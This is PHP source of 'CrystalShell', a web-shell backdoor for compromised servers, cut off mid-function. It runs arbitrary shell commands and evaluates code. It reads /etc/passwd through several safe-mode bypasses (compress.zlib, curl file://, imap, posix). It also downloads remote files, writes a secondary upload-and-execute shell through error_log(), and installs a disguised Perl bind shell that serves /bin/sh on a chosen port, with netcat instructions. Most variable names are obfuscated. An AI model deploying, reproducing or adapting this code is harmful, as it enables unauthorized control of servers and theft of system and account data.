<?php
?>
<?




error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
/**********************************************************/
/*                          CrystalShell v.1
/*                       --------- ----------
/*
/*       Coded by : Super-Crystal and Mohajer22
/*    ------------------------------------------------
/*    Arab Security Center Team <---thanks
/*      mail : sup3r-hackers@hotmail.Com
/* october73 shell & CrystalShell < coding by super crystal
/*
/*********************************************************/
?>
<?$dir=realpath("./")."/";
$dir=str_replace("\\","/",$dir);
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa"><title>
Crystal shell</title>
<style type='text/css'> body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img
{background-color:   #FFFFFF   !important}  input  {background-color:   #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #1CBr81; } a:hover{text-decoration: underline;
color : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}-->
  </style>
  <![endif]-->
<meta http-equiv=Content-Language content=ar>
<!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
 <style>
<!--
body { scrollbar-face-color: #000000; scrollbar-shadow-color: #CC0000; scrollbar-highlight-color: #CC0000; scrollbar-3dlight-color: #000000; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #000000; scrollbar-arrow-color: #ffffff }
-->
</style>
<style> 
<!-- 
#leftright, #topdown{ 
position:absolute; 
left:0; 
top:0; 
width:1px; 
height:1px; 
layer-background-color:limegreen; 
background-color:red; 
z-index:100; 
font-size:1px; 
} 
--> 
</style>

</head>
  </head>
<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
	<th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
<p align="center">&nbsp;</p>
	<p align="center">
<a bookmark="minipanel">
	<font face="Webdings" size="7" color="#DCE7EF">ِ</font></a><font size="7" face="Martina">CRYSTAL-H</font><span lang="en-us"><font size="3" face="Martina"> </font>
	<font size="1" face="Arial">Crystal hack shellphp</font></span><font color="#FFFF00" face="Arial" size="1">&nbsp;<span lang="en-us">2006-2007</span></font></p>
</p>
<a bookmark="minipanel">
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
<p align="center">
	<b>
	<?
	$dirfile="$file_to_download";
if (file_exists("$dirfile"))
{
header("location: $dirfile");
}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";


}

else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
echo("Safe-mode: $hsafemode");
// PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() b&#7883; c&#7845;m";
	exit;
}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<br>");
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<br>");
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo("<br>");
echo "PHP version: <b>".@phpversion()."</b>";
echo("<br>");
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));

echo("<br>");
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);

?>
</b></p>
	<p align="center">&nbsp;</p></td></tr></table>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
	<b>
</b></p>
	<p align="center">&nbsp;</p></td></tr></table>

</a>



</p>
	<p align="center"><font color="#FFFF00">&nbsp;</font></p>
	<p align="center"></p>
	</th></tr><tr>
		<td bgcolor="#000000" style="color: #DCE7EF">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font size="4px">
<b>
		<font size="1" face="Verdana" color="#DCE7EF">OS:</font><font color="#DCE7EF" size="-2" face="verdana"><font size="1" face="Arial">&nbsp;<?php  echo php_uname(); ?>
&nbsp;</font></span></font></b><p>
<font size="1" face="Verdana" color="#DCE7EF">Server:</font><font color="#DCE7EF" size="1" face="Arial">&nbsp;</font><font color="#DCE7EF" size="1" face="Arial"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
&nbsp;</font></font>
</font>
</p>
</font>
<font size=1 face=Verdana>
<p><font color="#DCE7EF">User</font></font><font size="1" face="Verdana" color="#DCE7EF">:</font><font size=-2 face=verdana color="#00000"> </font>
</b>
	</font>
	</font>
	<a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none">
<font size=-2 face=verdana color="#FFFFFF">
<? passthru("id");?></font><font size=-2 face=verdana color="black"><br>
	</font>
</a><span lang="en-us"><font face="Wingdings" size="3" color="#FFFFFF">1</font></span><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><font size="-2" face="verdana"><font size=-2 face=Verdana color="#DCE7EF">:</font><font size=-2 face=verdana color="#DCE7EF">
<? echo getcwd();?></div></font></font></a></font></b></a></font><br>

<br>&nbsp;<b><font size="4px"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font color="#FF0000" face="Verdana" size="-2">
&nbsp;</font></a></font><font size="4px"><font size=-2 face=verdana></a><font face="Verdana" size="-2">&nbsp;</font></font></font><a href=# onClick=location.href="javascript:history.back(-1)" style="color: white; text-decoration: none"><font face=Verdana><font color="#CC0000" size="3" face="verdana">Back</font><font color="#DCE7EF" size="1" face="verdana"> </font>

	</font></a><font face="Wingdings" size="5" color="#C0C0C0">ً</font><span lang="en-us"><font size="5" color="#C0C0C0" face="Webdings">
</font></span><font face="verdana" color="white"><font face=Verdana><font face=verdana color=white></font></font></font><font face=Verdana color="white"><a href=?action=phpinfo target=\"_blank\" style="color: white; text-decoration: none"><font color="#CC0000" size="3"><a target="\&quot;_blank\&quot;" style="text-decoration: none" title="معلومات الـPhp" href="?action=phpinfo"><font color="#CC0000">phpinfo</font></a></font></a></font></b><span lang="en-us"><font color="#C0C0C0" face="Wingdings" size="5">2</font></span><b><font size=-2 face=verdana>
</font>
</b><b><font size="4px"><font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="-2">&nbsp;</font></font></font><font face="verdana" color="white"><span lang="en-us"><a title="الأدوات" href="?act=tools"><font color=#CC0000 size="3">Tools</font></a></span></font><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Wingdings 2" size="5">4</font></span></a><font size="4px" face="verdana" color="white"></a></font></b><b><font face=Verdana size="4px"><font size=-2 face=verdana>
</font></font></b><b><font size="4px">
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="-2"><span lang="en-us">&nbsp;</span> </font></font></font>
<font face="verdana" color="white"><span lang="en-us">
<a title="التشفير" href="?act=decoder"><font color=#CC0000 size="3">Decoder</font></a></span></font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Webdings" size="5">i</font></span></a><font size="3" face="verdana" color="white"></a></font><font size=-2 face=verdana>
</font>
</b><b><font size="4px"><font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="-2"><span lang="en-us">&nbsp;</span> </font>
	</font></font><span lang="en-us"><font face="verdana" color="white">
	<a href="?act=bypass"><font color=#CC0000 size="3">
<a title="ثغرات المرور" href="?act=bypass"><font color="#CC0000">ByPass</font></a></font></a></font><font face="Webdings" size="5" color="#C0C0C0">`</font></span><font size="4px" face="verdana" color="white"></a></font><font size=3 face=verdana>
</font>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="-2"><span lang="en-us">&nbsp;</span> </font>
	</font><font face="verdana" color="white"><span lang="en-us">
<a title="الإتصال بقاعدة البيانات" href="?act=SQL"><font color=#CC0000 size="3">SQL</font></a></span></font></b><font face="Webdings" size="5" color="#C0C0C0">آ</font><b><font size="3" face="verdana" color="white"></a></font></b><font size="3"></font></font><b><font face=Verdana size="4px"><font size=-2 face=verdana>
</font></font></b><font size="4px"><b>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="-2"><span lang="en-us">&nbsp;</span></font></font></b></font><b><span lang="en-us"><font face="verdana" color="white"><a title="bind shell" href="?act=bindport"><font color=#CC0000 size="3">Bind</font></a></font></span></b><font face="Webdings" size="5" color="#C0C0C0">آ</font><font size="4px"><b><font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="-2"> </font>
	</font></b></font><b><font face="verdana" color="white">
	</b><b>
	<a href="?act=help"><span lang="en-us"><font color=#CC0000 size="3">
<a title="المساعدة" href="?act=help"><font color="#CC0000">help</font></a></font></span></a></b></font><b><a title="المساعدة" href="?act=help"><font size="4px" face="verdana" color="#CC0000"></a></font></a><font size=3 face=verdana>
</font><span lang="en-us"><font color="#C0C0C0" face="Webdings" size="5">s</font></span><font face="verdana" color="white"><span lang="en-us"><font color=#CC0000 size="3"><a title="اقراءني" href="?act=about"><font color="#CC0000">about</font></a></font></span></a></font></a><font size=3 face=verdana>
</font></b><span lang="en-us"><font size=5 face=Wingdings color="#C0C0C0">
?</font></span></p>
<p><font size="4px"><font size=-2 face=verdana color=white><font size="4px" face="Verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="-2">
[</font></a></font><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font face="Webdings" color="#DCE7EF">j</font></a><font color=#CC0000 face="Verdana" size="-2"> </font>

<font size="4px">
	<font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
	<font size=-2 face=verdana color=#CC0000>server </font>
	<font size="1" face="verdana" color="#CC0000">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php  echo $spe9203a; ?>
	</font></a></font>
</a></font>
</font><b>
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF size="-2" face="verdana">]&nbsp; </font>
<font size=-2 face=verdana color=white>
	<font size="4px" face="verdana" color="white">
	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
	<font face=Verdana size=-2 color="#008000">
	CGI v</font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php  echo $spb83776; ?>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
	<font face=Verdana size=-2 color="#008000">&nbsp;HTTP v</font></a></font><font size="1" face="verdana">:</font><font size="4px" face="verdana" color="DCE7EF"><font face=Verdana size=-2> <?php  echo $sp397067; ?>
</font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font face=Verdana size=-2><font size=-2 face=verdana color=#DCE7EF>&nbsp;</font><font size=-2 face=verdana color=#008000>Mail
admin</font></font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php  echo $sp25b41e; ?>
&nbsp;&nbsp;&nbsp;&nbsp; </font><font face=Verdana size=-2 color="black"> &nbsp; </font></a></font>
</font>
	</b>
</font></a>&nbsp;&nbsp;<br>

<font size="4px">
<b>
<font size=-2 face=verdana color=white>
	<font face=Verdana size=-2 color="#CC0000">
	<a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none">
	<font face="Wingdings" size="3" color="#000000">:</font></a></font><font size=-2 face=verdana color=#CC0000>&nbsp;&nbsp;</font><font face="Verdana" size="-2" color="#CC0000">IP</font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px" face="verdana" color="white"><font face=Verdana size=-2>
	</font><font size="1" face="verdana">&nbsp;</font></font><font size="1" face="verdana" color="#CC0000">SERVER:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php  echo $spabda33; ?>
	</font>
	</a>

<font size="4px">
</a>
<font size=-2 face=verdana color=white>

	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</font></font>
	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
	<font size="4px"><font face=Verdana size=-2 color="black">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	</font>
	<font size="4px" face="verdana" color="white"><font face=Verdana size=-2 color="#008000">
port
	</font><font size="1" face="verdana" color="#000000">:</font><font face=Verdana size=-2 color="red"> <?php  echo $sp33f6bb; ?>
	</font></font>
	</font>
	</font>
	</b>
</font></p></td></tr></table>
<?
if ($act == "help") {echo "<center><b>السلام عليكم ورحمة الله وبركاته<br><br>عزيزي المستخدم<br>اذا اردت المساعدة اضغط على اسم الخيار الموضح باللون الازرق<br>وستظهر لك معلومات الخيار   </a>.</b>";}
if ($act == "bindport"){
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">
<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Connect\"></form></div>";
}
if ($act == "tools"){
	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
File to edit:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";
 echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<table id=tb><tr><td>
<INPUT type=\"hidden\" name=\"php\" value=\"yes\">
<INPUT type=\"submit\" value=\"eval code\" id=input></form></div></td></table>";
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>Download here <b>from</b>:
<INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
<b>-->>:</b>
<INPUT type=\"text\" name=\"fileto\" size=30>
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
<INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";
}
if ($act == "about") {echo "<center><b>Coding by:<br><br>Super-Crystal<br>&<br>Mohajer22<br>-----<br>Thanks <br>TrYaG Team <br> ArabSecurityCenter Team <br>CRYSTAL-H Version:0 Beta phpshell code<br>Saudi Arabic  </a>.</b>";}

if ($act == "bind") {echo "<center><b>CRYSTAL-H:<br><br>-Connect قم بالضغط على خيار.<br>.- بعد مايتم انزال السكريبت بالمجلد<br>.-توجه لاداة النت كات وتصنت على<br>nc -lp 3333بكتابة المنفذ - <br>السكريبت بلغة البيرل <br>Bind port to  :<br> bind shell وهنيئا ً لك   </a>.</b>";}

if ($act == "command") {echo "<center><b>CRYSTAL-H:<br><br>لأختيار الاوامر الجاهزه  Select ------ x  اضغط على الخيار<br>.- واذا اردت كتابه  الاوامر بنفسك قد تكتفي بالخيار<br>Command   </a>.</b>";}

if ($act == "team") {echo "<center><b>Arab Security Center Team<br><br>Super-Crystal<br>Medo-HaCKer<br>Anaconda<br>Alsb0r<br> ReeM-HaCK <br>NoOFa <br> AL-Alame<br>The YounG HackeR<br>Anti-Hack<br>Thanks  </a>.</b>";}
if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}

if ($act == "bypass") {
echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
<table id=tb><tr><td>Execute:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>
";
echo ("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>read file :
<INPUT type=\"text\" name=\"copy\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>read file :
<INPUT type=\"text\" name=\"curl\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td><select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>
<INPUT type=\"text\" name=\"string\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<select name=plugin><option>cat /etc/passwd</option></select>
<INPUT type=\"submit\" value=\"Show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<INPUT type=\"text\" name=\"ERORR\" size=30 value=\"\">
<INPUT type=\"submit\" value=\"Write\" id=input></td></tr></table></form></div>";
}
if ($act == "decoder"){
echo ("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<textarea name=\"Mohajer22\" cols=\"50\" rows=\"15\" wrar=\"off\">
</textarea><br>
<INPUT type=\"submit\" value=\"Replace\" id=input></td></tr></table></form></div>";
}
if ($act == "SQL"){
echo ("<FONT COLOR=\"RED\">   MySQL    </FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td> Username :
<INPUT type=\"text\" name=\"username\" size=30 value=\"\">\n
password :
<INPUT type=\"password\" name=\"password\" size=30 value=\"\">\n
<input type=submit value='Enter'>\n
<input type=reset value='Clear'></td></tr></table></form></div>";
}
?>



<br>
<TABLE style="BORDER-COLLAPSE: collapse; color:#000000" cellSpacing=0 borderColorDark=#DCE7EF cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#C0C0C0 border=1><tr>
	<td width="100%" valign="top" style="color: #00000" bgcolor="#000000">
	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
	<TABLE style="BORDER-COLLAPSE: collapse; font-family:Verdana; font-size:11px; color:#000000; background-color:#0000000" height=1 cellSpacing=0 borderColorDark=#000000 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#DCE7EF border=1>
	<tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
	<td width="990" height="1" valign="top" style="border:1px solid #00000; font-family: Verdana; color: #000000; font-size: 11px; "><p align="center">
	&nbsp;</p>
	<p align="center">&nbsp;<table style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
		<tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
			<td style="font-size: 13px; font-family: verdana, arial, helvetica; color: red; background-color: #0000000">
<?php  if (empty($_POST['Mohajer22'])) { } else { $sp838cde = $_POST['Mohajer22']; $sp838cde = str_replace(' ', '', $sp838cde); $sp838cde = str_replace('(', '', $sp838cde); $sp838cde = str_replace(')', '', $sp838cde); $sp838cde = str_replace('.', ';', $sp838cde); $sp838cde = str_replace('chr', '&#', $sp838cde); $sp838cde = str_replace(' ', '', $sp838cde); echo $sp838cde; } if (empty($_POST['ERORR'])) { } else { $sp5c7dc4 = $_POST['ERORR']; echo error_log('
<html>
<head>
<title> Exploit: error_log() By * Super-Crystal  * </title>
<body bgcolor="#000000">
<table Width=\'100%\' height=\'10%\' bgcolor=\'#8C0404\' border=\'1\'>
<tr>
<td><center><font size=\'6\' color=\'#BBB516\'> By  * Super-Crystal * TrYaG Team</font></center></td>
</tr>
</table>
<font color=\'#FF0000\'>
</head>
<?
if($fileup == ""){
ECHO " reade for up ";
}else{
$path= exec("pwd");
$path .= "/$fileup_name";
$CopyFile = copy($fileup,"$path");
if($CopyFile){
echo " up ok ";
}else{
echo " no up ";
}
}
if(empty($_POST[\'m\'])){
} else {
$m=$_POST[\'m\'];
echo  system($m);
}
if(empty($_POST[\'cmd\'])){
} else {
$h=  $_POST[\'cmd\'];
 print include($h) ;
   }


?>
<form method=\'POST\' enctype=\'multipart/form-data\' action=\'Super-Crystal.php\'>
<input type=\'file\' name=\'fileup\' size=\'20\'>
<input type=\'submit\' value=\'  up  \'>
</form>
<form method=\'POST\'  action=\'Super-Crystal.php\'>
<input type=\'cmd\' name=\'cmd\' size=\'20\'>
<input type=\'submit\' value=\'  open (shill.txt) \'>
</form>
<form method=\'POST\' enctype=\'multipart/form-data\' action=\'Super-Crystal.php\'>
<input type=\'text\' name=\'m\' size=\'20\'>
<input type=\'submit\' value=\'  run  \'>
<input type=\'reset\' value=\' reset \'>
</form>
', 3, $sp5c7dc4); } if ($_POST['plugin']) { switch ($_POST['plugin']) { case 'cat /etc/passwd': for ($spca6b76 = 0; $spca6b76 < 6000; $spca6b76++) { $spe68a84 = posix_getpwuid($spca6b76); if (!empty($spe68a84)) { while (list($sp8b00ef, $sp9c4d84) = each($spe68a84)) { print "{$sp9c4d84}:"; } print '<br>'; } } break; } } $sp5ecd68 = !empty($_POST['string']) ? $_POST['string'] : 0; $sp7a215f = !empty($_POST['switch']) ? $_POST['switch'] : 0; if ($sp5ecd68 && $sp7a215f == 'file') { $sp014958 = imap_open($sp5ecd68, '', ''); $sp6ff357 = imap_body($sp014958, 1); if (!empty($sp6ff357)) { echo '<pre>' . $sp6ff357 . '</pre>'; } imap_close($sp014958); } elseif ($sp5ecd68 && $sp7a215f == 'dir') { $sp014958 = imap_open('/etc/passwd', '', ''); if ($sp014958 == FALSE) { die('Can\'t open imap stream'); } $sp5ecd68 = explode('|', $sp5ecd68); if (count($sp5ecd68) > 1) { $spfa6c24 = imap_list($sp014958, trim($sp5ecd68[0]), trim($sp5ecd68[1])); } else { $spfa6c24 = imap_list($sp014958, trim($sp5ecd68[0]), '*'); } echo '<pre>'; for ($sp6c3e91 = 0; $sp6c3e91 < count($spfa6c24); $sp6c3e91++) { echo "{$spfa6c24[$sp6c3e91]}" . '<p>&nbsp;</p>'; } echo '</pre>'; imap_close($sp014958); } if (empty($_POST['curl'])) { } else { $sp838cde = $_POST['curl']; $sp8b1750 = curl_init('file:///' . $sp838cde . ' /../../../../../../../../../../../../' . __FILE__); curl_exec($sp8b1750); var_dump(curl_exec($sp8b1750)); } $spbf11e6 = ''; $spc62d5f = ''; if (empty($_POST['copy'])) { } else { $spbf11e6 = $_POST['copy']; $sp4eb460 = tempnam($spc62d5f, 'cx'); if (copy('compress.zlib://' . $spbf11e6, $sp4eb460)) { $sp67ff1a = fopen($sp4eb460, 'r'); $spf447af = fread($sp67ff1a, filesize($sp4eb460)); fclose($sp67ff1a); echo '' . htmlspecialchars($spf447af) . ''; unlink($sp4eb460); } else { die('<FONT COLOR="RED"><CENTER>Sorry... File
<B>' . htmlspecialchars($spbf11e6) . '</B> dosen\'t exists or you don\'t have
access.</CENTER></FONT>'); } } @($spa25e24 = $_POST['dir']); $spa25e24 = stripslashes($spa25e24); @($sp7bd36a = $_POST['cmd']); $sp7bd36a = stripslashes($sp7bd36a); $sp7e9961 = $_SERVER['REQUEST_URI']; $spd05dac = ''; $sp9f4c7d = ''; if (isset($_POST['port'])) { $spd2a1b6 = "\n#!/usr/bin/perl\n\n\$port = {$_POST['port']};\n\$port = \$ARGV[0] if \$ARGV[0];\nexit if fork;\n\$0 = \"updatedb\" . \" \" x100;\n\$SIG{CHLD} = 'IGNORE';\nuse Socket;\nsocket(S, PF_INET, SOCK_STREAM, 0);\nsetsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);\nbind(S, sockaddr_in(\$port, INADDR_ANY));\nlisten(S, 50);\nwhile(1)\n{\n\taccept(X, S);\n\tunless(fork)\n\t{\n\t\topen STDIN, \"<&X\";\n\t\topen STDOUT, \">&X\";\n\t\topen STDERR, \">&X\";\n\t\tclose X;\n\t\texec(\"/bin/sh\");\n\t}\n\tclose X;\n}\n"; } function decode($sp753119) { return convert_cyr_string($sp753119, 'd', 'w'); } function execute($sp98121c) { if (!empty($sp98121c)) { if (function_exists('exec')) { exec($sp98121c, $sp662a5a); echo implode('
', $sp662a5a); } elseif (function_exists('shell_exec')) { echo shell_exec($sp98121c); } elseif (function_exists('system')) { echo system($sp98121c); } elseif (function_exists('passthru')) { echo passthru($sp98121c); } } } function perms($sp9dace2) { if ($sp9dace2 & 4096) { $spb06e63 = 'p'; } else { if ($sp9dace2 & 8192) { $spb06e63 = 'c'; } else { if ($sp9dace2 & 16384) { $spb06e63 = 'd'; } else { if ($sp9dace2 & 24576) { $spb06e63 = 'b'; } else { if ($sp9dace2 & 32768) { $spb06e63 = '-'; } else { if ($sp9dace2 & 40960) { $spb06e63 = 'l'; } else { if ($sp9dace2 & 49152) { $spb06e63 = 's'; } else { $spb06e63 = 'u'; } } } } } } } $sp0581a1['read'] = $sp9dace2 & 256 ? 'r' : '-'; $sp0581a1['write'] = $sp9dace2 & 128 ? 'w' : '-'; $sp0581a1['execute'] = $sp9dace2 & 64 ? 'x' : '-'; $spbaefbe['read'] = $sp9dace2 & 32 ? 'r' : '-'; $spbaefbe['write'] = $sp9dace2 & 16 ? 'w' : '-'; $spbaefbe['execute'] = $sp9dace2 & 8 ? 'x' : '-'; $spa53dc9['read'] = $sp9dace2 & 4 ? 'r' : '-'; $spa53dc9['write'] = $sp9dace2 & 2 ? 'w' : '-'; $spa53dc9['execute'] = $sp9dace2 & 1 ? 'x' : '-'; if ($sp9dace2 & 2048) { $sp0581a1['execute'] = $sp0581a1['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 1024) { $spbaefbe['execute'] = $spbaefbe['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 512) { $spa53dc9['execute'] = $spa53dc9['execute'] == 'x' ? 't' : 'T'; } $sp676578 = sprintf('%1s', $spb06e63); $sp676578 .= sprintf('%1s%1s%1s', $sp0581a1['read'], $sp0581a1['write'], $sp0581a1['execute']); $sp676578 .= 